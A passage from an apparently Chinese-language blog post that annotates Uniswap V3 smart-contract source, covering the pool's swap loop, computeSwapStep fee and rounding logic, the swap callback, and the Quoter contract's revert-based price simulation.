class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function swap(<br>    address recipient, //收款地址<br>    bool zeroForOne, //代币交换方向，token0/token为true，token1/token0为false<br>    int256 amountSpecified, //交换的数量，数值可正可负<br>    uint160 sqrtPriceLimitX96, //价格平方根的Q64.96，如果是token0/token1方向的兑换，价格不能低于sqrtPriceLimitX96，如果是token1/token0方向，则不能大于<br>    bytes calldata data //回调函数的参数<br>) external override noDelegateCall returns (int256 amount0, int256 amount1) &#123;<br>//检查交易数量是否为0<br>    require(amountSpecified != 0, &#x27;AS&#x27;);<br><br>    //将交易前的数据保存在内存中，后续的访问通过 `MLOAD` 完成，节省 gas<br>    Slot0 memory slot0Start = slot0;<br><br>    //检查是否有正在进行的token交易操作<br>    require(slot0Start.unlocked, &#x27;LOK&#x27;);<br>    //根据交易方向检查价格是否满足条件<br>    require(<br>        zeroForOne<br>            ? sqrtPriceLimitX96 &lt; slot0Start.sqrtPriceX96 &amp;&amp; sqrtPriceLimitX96 &gt; TickMath.MIN_SQRT_RATIO<br>            : sqrtPriceLimitX96 &gt; slot0Start.sqrtPriceX96 &amp;&amp; sqrtPriceLimitX96 &lt; TickMath.MAX_SQRT_RATIO,<br>        &#x27;SPL&#x27;<br>    );<br><br>     //更新slot0.unlocked的状态，防止交易过程中回调到合约中其他的函数中修改状态变量<br>    slot0.unlocked = false;<br><br>    //缓存交易数据<br>    SwapCache memory cache =<br>        SwapCache(&#123;<br>            liquidityStart: liquidity,<br>            blockTimestamp: _blockTimestamp(),<br>            feeProtocol: zeroForOne ? (slot0Start.feeProtocol % 16) : (slot0Start.feeProtocol &gt;&gt; 4),<br>            secondsPerLiquidityCumulativeX128: 0,<br>            tickCumulative: 0,<br>            computedLatestObservation: false<br>        &#125;);<br><br>    //检查交换的数量是否大于0<br>    bool exactInput = amountSpecified &gt; 0;<br><br>    //存储交易状态信息<br>    SwapState memory state =<br>        SwapState(&#123;<br>            amountSpecifiedRemaining: amountSpecified,<br>            amountCalculated: 0,<br>            sqrtPriceX96: slot0Start.sqrtPriceX96,<br>            tick: slot0Start.tick,<br>            feeGrowthGlobalX128: zeroForOne ? feeGrowthGlobal0X128 : feeGrowthGlobal1X128,<br>            protocolFee: 0,<br>            liquidity: cache.liquidityStart<br>        &#125;);<br><br>    // continue swapping as long as we haven&#x27;t used the entire input/output and haven&#x27;t reached the price limit<br>    //通过 tokenIn 是否还有余额来判断是否还需要继续循环，进入下一步的进行交易计算。当 tokenIn 全部被耗尽后，交易就结束了。<br>    while (state.amountSpecifiedRemaining != 0 &amp;&amp; state.sqrtPriceX96 != sqrtPriceLimitX96) &#123;<br>        // 交易过程每一次循环的状态变量<br>        StepComputations memory step;<br><br>        // 交易的起始价格<br>        step.sqrtPriceStartX96 = state.sqrtPriceX96;<br><br>        // 通过位图找到下一个可以选的交易价格，这里可能是下一个流动性的边界，也可能还是在本流动性中<br>        (step.tickNext, step.initialized) = tickBitmap.nextInitializedTickWithinOneWord(<br>            state.tick,<br>            tickSpacing,<br>            zeroForOne<br>        );<br><br>        // ensure that we do not overshoot the min/max tick, as the tick bitmap is not aware of these bounds<br>        if (step.tickNext &lt; TickMath.MIN_TICK) &#123;<br>            step.tickNext = TickMath.MIN_TICK;<br>        &#125; else if (step.tickNext &gt; TickMath.MAX_TICK) &#123;<br>            step.tickNext = TickMath.MAX_TICK;<br>        &#125;<br><br>        // get the price for the next tick<br>        //从 tick index 计算 sqrt(price)<br>        step.sqrtPriceNextX96 = TickMath.getSqrtRatioAtTick(step.tickNext);<br><br>        // compute values to swap to the target tick, price limit, or point where input/output amount is exhausted<br>        // 计算当价格到达下一个交易价格时，tokenIn 是否被耗尽，如果被耗尽，则交易结束，还需要重新计算出 tokenIn 耗尽时的价格<br>// 如果没被耗尽，那么还需要继续进入下一个循环<br>// 会返回需要的手续费<br>// 下面有对此函数的分析<br>        (state.sqrtPriceX96, step.amountIn, step.amountOut, step.feeAmount) = SwapMath.computeSwapStep(<br>            state.sqrtPriceX96,<br>            (zeroForOne ? step.sqrtPriceNextX96 &lt; sqrtPriceLimitX96 : step.sqrtPriceNextX96 &gt; sqrtPriceLimitX96)<br>                ? sqrtPriceLimitX96<br>                : step.sqrtPriceNextX96,<br>            state.liquidity,<br>            state.amountSpecifiedRemaining,<br>            fee<br>        );<br><br>        // 更新 tokenIn 的余额，以及 tokenOut 数量，注意当指定 tokenIn 的数量进行交易时，这里的 tokenOut 是负数.<br>        //如果exactInput为true则表示input不为负数<br>        if (exactInput) &#123;<br>        //amountSpecifiedRemaining：剩余期望兑换的数量<br>        //amountCalculated：已经兑换的数量<br>            state.amountSpecifiedRemaining -= (step.amountIn + step.feeAmount).toInt256();<br>            state.amountCalculated = state.amountCalculated.sub(step.amountOut.toInt256());<br>        &#125; else &#123;<br>            state.amountSpecifiedRemaining += step.amountOut.toInt256();<br>            state.amountCalculated = state.amountCalculated.add((step.amountIn + step.feeAmount).toInt256());<br>        &#125;<br><br>        // if the protocol fee is on, calculate how much is owed, decrement feeAmount, and increment protocolFee<br>        //检查协议费用是否开启<br>        if (cache.feeProtocol &gt; 0) &#123;<br>        //计算欠费多少<br>            uint256 delta = step.feeAmount / cache.feeProtocol;<br>            step.feeAmount -= delta;<br>            state.protocolFee += uint128(delta);<br>        &#125;<br><br>        // update global fee tracker<br>        // 更新交易的 f_g，这里需要除以流动性 L<br>        // 更新时使用此步骤的手续费总额除以此步骤的流动性 L ，以得出每一份流动性所对应的手续费数值。<br>        if (state.liquidity &gt; 0)<br>            state.feeGrowthGlobalX128 += FullMath.mulDiv(step.feeAmount, FixedPoint128.Q128, state.liquidity);<br><br>        // shift tick if we reached the next price<br>        // 按需决定是否需要更新流动性 L 的值<br>        // 当价格到达当前步骤价格区间的边界时，可能需要穿过下一个 tick<br>        if (state.sqrtPriceX96 == step.sqrtPriceNextX96) &#123;<br>            // if the tick is initialized, run the tick transition<br>            //检查 tick index 是否为另一个流动性的边界<br>            if (step.initialized) &#123;<br>                // check for the placeholder value, which we replace with the actual value the first time the swap<br>                // crosses an initialized tick<br>                if (!cache.computedLatestObservation) &#123;<br>                    (cache.tickCumulative, cache.secondsPerLiquidityCumulativeX128) = observations.observeSingle(<br>                        cache.blockTimestamp,<br>                        0,<br>                        slot0Start.tick,<br>                        slot0Start.observationIndex,<br>                        cache.liquidityStart,<br>                        slot0Start.observationCardinality<br>                    );<br>                    cache.computedLatestObservation = true;<br>                &#125;<br>                int128 liquidityNet =<br>                    // 在这里需要更新 tick 的 f_o<br>                    ticks.cross(<br>                        step.tickNext,<br>                        (zeroForOne ? state.feeGrowthGlobalX128 : feeGrowthGlobal0X128),<br>                        (zeroForOne ? feeGrowthGlobal1X128 : state.feeGrowthGlobalX128),<br>                        cache.secondsPerLiquidityCumulativeX128,<br>                        cache.tickCumulative,<br>                        cache.blockTimestamp<br>                    );<br>                // if we&#x27;re moving leftward, we interpret liquidityNet as the opposite sign<br>                // safe because liquidityNet cannot be type(int128).min<br>                // 根据价格增加/减少，即向左或向右移动，增加/减少相应的流动性<br>                if (zeroForOne) liquidityNet = -liquidityNet;<br><br>                //更新流动性<br>                state.liquidity = LiquidityMath.addDelta(state.liquidity, liquidityNet);<br>            &#125;<br><br>            //在这里更 tick 的值，使得下一次循环时让 tickBitmap 进入下一个 word 中查询<br>            state.tick = zeroForOne ? step.tickNext - 1 : step.tickNext;<br>        &#125; else if (state.sqrtPriceX96 != step.sqrtPriceStartX96) &#123;<br>            // recompute unless we&#x27;re on a lower tick boundary (i.e. already transitioned ticks), and haven&#x27;t moved<br>            //如果 tokenIn 被耗尽，那么计算当前价格对应的 tick<br>            state.tick = TickMath.getTickAtSqrtRatio(state.sqrtPriceX96);<br>        &#125;<br>    &#125;<br><br>    // update tick and write an oracle entry if the tick change<br>    //当trick改变时写入一个oracle条目<br>    if (state.tick != slot0Start.tick) &#123;<br>        (uint16 observationIndex, uint16 observationCardinality) =<br>            observations.write(<br>                slot0Start.observationIndex,<br>                cache.blockTimestamp,<br>                slot0Start.tick,<br>                cache.liquidityStart,<br>                slot0Start.observationCardinality,<br>                slot0Start.observationCardinalityNext<br>            );<br>        (slot0.sqrtPriceX96, slot0.tick, slot0.observationIndex, slot0.observationCardinality) = (<br>            state.sqrtPriceX96,<br>            state.tick,<br>            observationIndex,<br>            observationCardinality<br>        );<br>    &#125; else &#123;<br>        // otherwise just update the price<br>        //否则只更新价格<br>        slot0.sqrtPriceX96 = state.sqrtPriceX96;<br>    &#125;<br><br>    // update liquidity if it changed<br>    //如果流动性发生变化则更新流动性<br>    if (cache.liquidityStart != state.liquidity) liquidity = state.liquidity;<br><br>    // update fee growth global and, if necessary, protocol fees<br>    // overflow is acceptable, protocol has to withdraw before it hits type(uint128).max fees<br>    // 更新费用<br>    // 在交易步骤完成后，更新合约的 f_g<br>    if (zeroForOne) &#123;<br>        feeGrowthGlobal0X128 = state.feeGrowthGlobalX128;<br>        if (state.protocolFee &gt; 0) protocolFees.token0 += state.protocolFee;<br>    &#125; else &#123;<br>        feeGrowthGlobal1X128 = state.feeGrowthGlobalX128;<br>        if (state.protocolFee &gt; 0) protocolFees.token1 += state.protocolFee;<br>    &#125;<br><br>    //确定最终用户支付的 token 数和得到的 token 数<br>    (amount0, amount1) = zeroForOne == exactInput<br>        ? (amountSpecified - state.amountSpecifiedRemaining, state.amountCalculated)<br>        : (state.amountCalculated, amountSpecified - state.amountSpecifiedRemaining);<br><br>    // do the transfers and collect payment<br>    //转账和费用收取<br>    if (zeroForOne) &#123;<br>        // 将 tokenOut 支付给用户，前面说过 tokenOut 记录的是负数<br>        if (amount1 &lt; 0) TransferHelper.safeTransfer(token1, recipient, uint256(-amount1));<br><br>        uint256 balance0Before = balance0();<br>        // 还是通过回调的方式，扣除用户需要支持的 token<br>        //这里还是通过回调完成用户支付 token 的费用。因为发送用户 token 是在回调函数之前完成的，因此这个 swap 函数是可以被当作 flash swap 来使用的。<br>        IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(amount0, amount1, data);<br>        // 校验扣除是否成功<br>        require(balance0Before.add(uint256(amount0)) &lt;= balance0(), &#x27;IIA&#x27;);<br>    &#125; else &#123;<br>        if (amount0 &lt; 0) TransferHelper.safeTransfer(token0, recipient, uint256(-amount0));<br><br>        uint256 balance1Before = balance1();<br>        IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(amount0, amount1, data);<br>        require(balance1Before.add(uint256(amount1)) &lt;= balance1(), &#x27;IIA&#x27;);<br>    &#125;<br><br>    //记录日志<br>    emit Swap(msg.sender, recipient, amount0, amount1, state.sqrtPriceX96, state.liquidity, state.tick);<br>    //解除防止重入的锁<br>    slot0.unlocked = true;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>由于这里还是通过回调完成用户支付 token 的费用。因为发送用户 token 是在回调函数之前完成的，因此这个 <code>swap</code> 函数是可以被当作 <code>flash swap</code> 来使用的。</p><p>需要注意，如果本次交易是交易路径中的一次中间交易，那么扣除的 token 是从 <code>SwapRouter</code> 中扣除的，交易完成获得的 token 也会发送给 <code>SwapRouter</code> 以便其进行下一步的交易</p><h3 id="computeSwapStep"><a href="#computeSwapStep" class="headerlink" title="computeSwapStep"></a>computeSwapStep</h3><p>交易是否能够结束的关键计算在 <code>SwapMath.computeSwapStep</code> 中完成，这里计算了交易是否能在目标价格范围内结束，以及消耗的 <code>tokenIn</code> 和得到的 <code>tokenOut</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function computeSwapStep(<br>        uint160 sqrtRatioCurrentX96,<br>        uint160 sqrtRatioTargetX96,<br>        uint128 liquidity,<br>        int256 amountRemaining,<br>        uint24 feePips<br>    )<br>        internal<br>        pure<br>        returns (<br>            uint160 sqrtRatioNextX96,<br>            uint256 amountIn,<br>            uint256 amountOut,<br>            uint256 feeAmount<br>        )<br>    &#123;<br>        // 判断交易的方向，即价格降低或升高<br>        bool zeroForOne = sqrtRatioCurrentX96 &gt;= sqrtRatioTargetX96;<br>        // 判断是否指定了精确的 tokenIn 数量<br>        bool exactIn = amountRemaining &gt;= 0;<br><br>        if (exactIn) &#123;<br>        // 先将 tokenIn 的余额扣除掉最大所需的手续费<br>            uint256 amountRemainingLessFee = FullMath.mulDiv(uint256(amountRemaining), 1e6 - feePips, 1e6);<br>            // 通过公式计算出到达目标价所需要的 tokenIn 数量，这里对 x token 和 y token 计算的公式是不一样的<br>            amountIn = zeroForOne<br>                //getAmount0Delta和getAmount1Delta的具体实现在上一章有详细解释<br>                ? SqrtPriceMath.getAmount0Delta(sqrtRatioTargetX96, sqrtRatioCurrentX96, liquidity, true)<br>                : SqrtPriceMath.getAmount1Delta(sqrtRatioCurrentX96, sqrtRatioTargetX96, liquidity, true);<br>            // 判断余额是否充足，如果充足，那么这次交易可以到达目标交易价格，否则需要计算出当前 tokenIn 能到达的目标交易价<br>            if (amountRemainingLessFee &gt;= amountIn) sqrtRatioNextX96 = sqrtRatioTargetX96;<br>            else<br>                sqrtRatioNextX96 = SqrtPriceMath.getNextSqrtPriceFromInput(<br>                    sqrtRatioCurrentX96,<br>                    liquidity,<br>                    amountRemainingLessFee,<br>                    zeroForOne<br>                );<br>        &#125; else &#123;<br>            amountOut = zeroForOne<br>                ? SqrtPriceMath.getAmount1Delta(sqrtRatioTargetX96, sqrtRatioCurrentX96, liquidity, false)<br>                : SqrtPriceMath.getAmount0Delta(sqrtRatioCurrentX96, sqrtRatioTargetX96, liquidity, false);<br>            if (uint256(-amountRemaining) &gt;= amountOut) sqrtRatioNextX96 = sqrtRatioTargetX96;<br>            else<br>                // 当余额不充足的时候计算能够到达的目标交易价<br>                sqrtRatioNextX96 = SqrtPriceMath.getNextSqrtPriceFromOutput(<br>                    sqrtRatioCurrentX96,<br>                    liquidity,<br>                    uint256(-amountRemaining),<br>                    zeroForOne<br>                );<br>        &#125;<br><br>        // 判断是否能够到达目标价<br>        bool max = sqrtRatioTargetX96 == sqrtRatioNextX96;<br><br>        // get the input/output amounts<br>        if (zeroForOne) &#123;<br>            // 根据是否到达目标价格，计算 amountIn/amountOut 的值<br>            amountIn = max &amp;&amp; exactIn<br>                ? amountIn<br>                : SqrtPriceMath.getAmount0Delta(sqrtRatioNextX96, sqrtRatioCurrentX96, liquidity, true);<br>            amountOut = max &amp;&amp; !exactIn<br>                ? amountOut<br>                : SqrtPriceMath.getAmount1Delta(sqrtRatioNextX96, sqrtRatioCurrentX96, liquidity, false);<br>        &#125; else &#123;<br>            amountIn = max &amp;&amp; exactIn<br>                ? amountIn<br>                : SqrtPriceMath.getAmount1Delta(sqrtRatioCurrentX96, sqrtRatioNextX96, liquidity, true);<br>            amountOut = max &amp;&amp; !exactIn<br>                ? amountOut<br>                : SqrtPriceMath.getAmount0Delta(sqrtRatioCurrentX96, sqrtRatioNextX96, liquidity, false);<br>        &#125;<br><br>        // cap the output amount to not exceed the remaining output amount<br>        // 这里对 Output 进行 cap 是因为前面在计算 amountOut 时，有可能会使用 sqrtRatioNextX96 来进行计算<br>// 而 sqrtRatioNextX96 可能被 Round 之后导致 sqrt_P 偏大，从而导致计算的 amountOut 偏大<br>        if (!exactIn &amp;&amp; amountOut &gt; uint256(-amountRemaining)) &#123;<br>            amountOut = uint256(-amountRemaining);<br>        &#125;<br><br>        // 根据交易是否移动到价格边界来计算手续费的数额<br>        if (exactIn &amp;&amp; sqrtRatioNextX96 != sqrtRatioTargetX96) &#123;<br>            // we didn&#x27;t reach the target, so take the remainder of the maximum input as fee<br>            // 如果没能到达目标价，即交易结束，剩余的 tokenIn 将全部作为手续费<br>    // 为了不让计算进一步复杂化，这里直接将剩余的 tokenIn 将全部作为手续费<br>    // 因此会多收取一部分手续费，即按本次交易的最大手续费收取<br>            feeAmount = uint256(amountRemaining) - amountIn;<br>        &#125; else &#123;<br>            // 当价格移动到边界时，计算相应的手续费<br>            feeAmount = FullMath.mulDivRoundingUp(amountIn, feePips, 1e6 - feePips);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>在进行交易输入/输出的计算时，和流动性的计算一样，也会遇到 rounding 的问题，处理的原则是：</p><ol><li>当计算 output 时，使用 RoundDown，保证 pool 不会出现坏账</li><li>当计算 input 时，使用 RoundUp，保证 pool 不会出现坏账</li><li>当通过 input 计算 √P 时，如果 √P 会减少，那么使用 RoundUp，这样可以保证 √ΔP 被 RoundDown，在后续计算 output 时不会使 pool 出现坏账。反之 如果 √P 会增大， 那么使用 RoundDown</li><li>当通过 output 计算 √P 时，如果 √P 会减少，那么使用 RoundDown，这样可以保证 √ΔP 被 RoundUp，在后续计算 input 时不会使 pool 出现坏账。反之 如果 √P 会增大， 那么使用 RoundUp</li></ol><h3 id="uniswapV3SwapCallback"><a href="#uniswapV3SwapCallback" class="headerlink" title="uniswapV3SwapCallback"></a>uniswapV3SwapCallback</h3><p>支付的回调函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function uniswapV3SwapCallback(<br>    int256 amount0Delta,<br>    int256 amount1Delta,<br>    bytes calldata _data<br>) external override &#123;<br>    require(amount0Delta &gt; 0 || amount1Delta &gt; 0); // swaps entirely within 0-liquidity regions are not supported<br>    SwapCallbackData memory data = abi.decode(_data, (SwapCallbackData));<br>    (address tokenIn, address tokenOut, uint24 fee) = data.path.decodeFirstPool();<br>    CallbackValidation.verifyCallback(factory, tokenIn, tokenOut, fee);<br><br>    // 判断函数的参数中哪个是本次支付需要支付的代币<br>    (bool isExactInput, uint256 amountToPay) =<br>        amount0Delta &gt; 0<br>            ? (tokenIn &lt; tokenOut, uint256(amount0Delta))<br>            : (tokenOut &lt; tokenIn, uint256(amount1Delta));<br>    if (isExactInput) &#123;<br>        // 调用 pay 函数支付代币<br>        pay(tokenIn, data.payer, msg.sender, amountToPay);<br>    &#125; else &#123;<br>        // either initiate the next swap or pay<br>        if (data.path.hasMultiplePools()) &#123;<br>            data.path = data.path.skipToken();<br>            exactOutputInternal(amountToPay, msg.sender, 0, data);<br>        &#125; else &#123;<br>            amountInCached = amountToPay;<br>            tokenIn = tokenOut; // swap in/out because exact output swaps are reversed<br>            pay(tokenIn, data.payer, msg.sender, amountToPay);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>回调完成后，<code>swap</code> 函数会返回本次交易得到的代币数量。<code>exactInput</code> 将判断是否进行下一个路径的交易，直至所有的交易完成，进行输入约束的检查：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">require</span>(amountOut &gt;= <span class="hljs-keyword">params</span>.amountOutMinimum, <span class="hljs-string">&#x27;Too little received&#x27;</span>);<br></code></pre></td></tr></table></figure><p>如果交易的获得 token 数满足约束，则本次交易结束。</p><h1 id="交易预计算"><a href="#交易预计算" class="headerlink" title="交易预计算"></a>交易预计算</h1><p>当用户和 uniswap 前端进行交互时，前端需要预先计算出用户输入 token 能够预期得到的 token 数量。</p><p>这个功能在 uniswap v2 有非常简单的<a href="https://github.com/Uniswap/uniswap-v2-periphery/blob/dda62473e2da448bc9cb8f4514dadda4aeede5f4/contracts/libraries/UniswapV2Library.sol#L42-L59">实现</a>，只需要查询处合约中两个代币的余额就可以完成预计算。</p><p>但是在 v3 版本中，由于交易的计算需要使用合约内的 tick 信息，预计算只能由 uniswap v3 pool 合约来完成，但是 pool 合约中的计算函数都是会更改合约状态的 <code>external</code> 函数，那么如何把这个函数当作 <code>view/pure</code> 函数来使用呢？uniswap v3 periphery 仓库中给出了一个非常 tricky 的实现，代码在 <code>contracts/lens/Quoter.sol</code> 中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function quoteExactInputSingle(<br>    address tokenIn,<br>    address tokenOut,<br>    uint24 fee,<br>    uint256 amountIn,<br>    uint160 sqrtPriceLimitX96<br>) public override returns (uint256 amountOut) &#123;<br>    bool zeroForOne = tokenIn &lt; tokenOut;<br><br>    try<br>        // 调用 pool 合约的 swap 接口来模拟一次真实的交易<br>        getPool(tokenIn, tokenOut, fee).swap(<br>            address(this), // address(0) might cause issues with some tokens<br>            zeroForOne,<br>            amountIn.toInt256(),<br>            sqrtPriceLimitX96 == 0<br>                ? (zeroForOne ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1)<br>                : sqrtPriceLimitX96,<br>            abi.encodePacked(tokenIn, fee, tokenOut)<br>        )<br>    &#123;&#125; catch (bytes memory reason) &#123;<br>        return parseRevertReason(reason);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>函数中调用了 <code>getPool(tokenIn, tokenOut, fee).swap()</code>，即 pool 合约的真实交易函数，但是实际上我们并不想让交易发生，这个交易调用必定也会失败，因此合约使用了 <code>try/catch</code> 的方式捕获错误，并且在回调函数中获取到模拟交易的结果，存入内存中。</p><p>uniswapV3SwapCallback回调函数的实现：</p><p>这个回调函数主要的作用就是将 <code>swap()</code> 函数计算处的结果保存到内存中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function uniswapV3SwapCallback(<br>    int256 amount0Delta,<br>    int256 amount1Delta,<br>    bytes memory path<br>) external view override &#123;<br>    require(amount0Delta &gt; 0 || amount1Delta &gt; 0); // swaps entirely within 0-liquidity regions are not supported<br>    (address tokenIn, address tokenOut, uint24 fee) = path.decodeFirstPool();<br>    CallbackValidation.verifyCallback(factory, tokenIn, tokenOut, fee);<br><br>    (bool isExactInput, uint256 amountToPay, uint256 amountReceived) =<br>        amount0Delta &gt; 0<br>            ? (tokenIn &lt; tokenOut, uint256(amount0Delta), uint256(-amount1Delta))<br>            : (tokenOut &lt; tokenIn, uint256(amount1Delta), uint256(-amount0Delta));<br>    if (isExactInput) &#123;<br>        // 这里代码需要将结果保存在内存中<br>        assembly &#123;<br>            // 0x40 是 solidity 定义的 free memory pointer<br>            let ptr := mload(0x40)<br>            // 将结果保存起来<br>            mstore(ptr, amountReceived)<br>            // revert 掉交易，并将内存中的数据作为 revert data<br>            revert(ptr, 32)<br>        &#125;<br>    &#125; else &#123;<br>        // if the cache has been populated, ensure that the full output amount has been received<br>        if (amountOutCached != 0) require(amountReceived == amountOutCached);<br>        assembly &#123;<br>            let ptr := mload(0x40)<br>            mstore(ptr, amountToPay)<br>            revert(ptr, 32)<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>将结果保存到内存中时候就将交易 <code>revert</code> 掉，然后在 <code>quoteExactInputSingle</code> 中捕获这个错误，并将内存中的信息读取出来，返回给调用者：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @dev Parses a revert reason that should contain the numeric quote<br>function parseRevertReason(bytes memory reason) private pure returns (uint256) 